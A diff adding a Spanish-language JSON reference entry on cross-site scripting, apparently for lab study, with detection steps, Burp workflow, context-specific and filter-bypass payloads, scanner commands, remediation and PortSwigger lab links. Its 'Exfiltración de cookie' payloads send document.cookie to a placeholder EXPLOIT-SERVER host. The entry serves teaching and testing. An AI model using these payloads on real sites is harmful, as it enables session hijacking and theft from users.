@@ -1,0 +1,73 @@
+{
+  "id": "xss",
+  "name": "Cross-Site Scripting (XSS)",
+  "category": "Client-side",
+  "severity": "High",
+  "aka": ["XSS"],
+  "summary": "La aplicación incluye datos controlados por el atacante en una página sin escaparlos correctamente, permitiendo ejecutar JavaScript en el navegador de otros usuarios (robo de sesión, acciones en su nombre, defacement).",
+  "where_to_look": [
+    "Reflejada: parámetros que se reflejan en la respuesta (búsquedas, mensajes de error).",
+    "Almacenada: comentarios, perfiles, nombres, cualquier dato persistido y mostrado a otros.",
+    "DOM-based: sinks JS como innerHTML, document.write, eval, location, jQuery .html()."
+  ],
+  "detection": [
+    "Inyecta un marcador único (p. ej. cz7x9) y búscalo en la respuesta para ver el contexto exacto.",
+    "Identifica el contexto: HTML, atributo, dentro de <script>, URL o evento.",
+    "Prueba si los caracteres < > \" ' se reflejan sin escapar.",
+    "Para DOM XSS, busca en DevTools cómo fluye el dato desde source (location.hash) hasta el sink."
+  ],
+  "burp_steps": [
+    "Manda la petición al Repeater y prueba un payload acorde al contexto detectado.",
+    "Usa Burp Suite > Engagement tools > Generate CSRF PoC o crea tu propio HTML para XSS almacenada.",
+    "Para confirmar ejecución sin riesgo, usa alert(document.domain) o print().",
+    "Si hay filtros, prueba variaciones de capitalización, codificación HTML y eventos alternativos.",
+    "Para exfiltrar cookies en el lab, apunta el fetch a tu Burp Collaborator o al exploit server del lab."
+  ],
+  "payloads": {
+    "Contexto HTML": [
+      "<script>alert(document.domain)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>"
+    ],
+    "Dentro de atributo": [
+      "\"><script>alert(1)</script>",
+      "\" autofocus onfocus=alert(1) x=\"",
+      "' onmouseover='alert(1)"
+    ],
+    "Dentro de <script>": [
+      "</script><script>alert(1)</script>",
+      "';alert(1)//",
+      "'-alert(1)-'"
+    ],
+    "Bypass de filtros": [
+      "<img src=x onerror=alert`1`>",
+      "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+      "javascript:alert(1)",
+      "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">"
+    ],
+    "Exfiltración de cookie (labs)": [
+      "<script>fetch('https://EXPLOIT-SERVER/?c='+document.cookie)</script>",
+      "<img src=x onerror=\"this.src='https://EXPLOIT-SERVER/?c='+document.cookie\">"
+    ]
+  },
+  "commands": [
+    {"tool": "dalfox", "desc": "Escaneo de XSS sobre una URL con parámetros", "cmd": "dalfox url 'https://lab/?search=test'"},
+    {"tool": "kxss/Gxss", "desc": "Detecta parámetros reflejados que no escapan caracteres especiales", "cmd": "echo 'https://lab/?q=1' | Gxss"}
+  ],
+  "remediation": [
+    "Escapa la salida según el contexto (HTML, atributo, JS, URL).",
+    "Usa frameworks que auto-escapan y evita sinks peligrosos (innerHTML → textContent).",
+    "Aplica una Content-Security-Policy restrictiva como defensa en profundidad."
+  ],
+  "portswigger_labs": [
+    {"title": "XSS reflejada en contexto HTML sin nada bloqueado", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded"},
+    {"title": "XSS almacenada en contexto HTML", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded"},
+    {"title": "DOM XSS en document.write con source location.search", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"},
+    {"title": "Robo de cookies vía XSS", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies"}
+  ],
+  "references": [
+    {"title": "PortSwigger — Cross-site scripting", "url": "https://portswigger.net/web-security/cross-site-scripting"},
+    {"title": "PortSwigger — XSS cheat sheet", "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"},
+    {"title": "OWASP — XSS", "url": "https://owasp.org/www-community/attacks/xss/"}
+  ]
+}
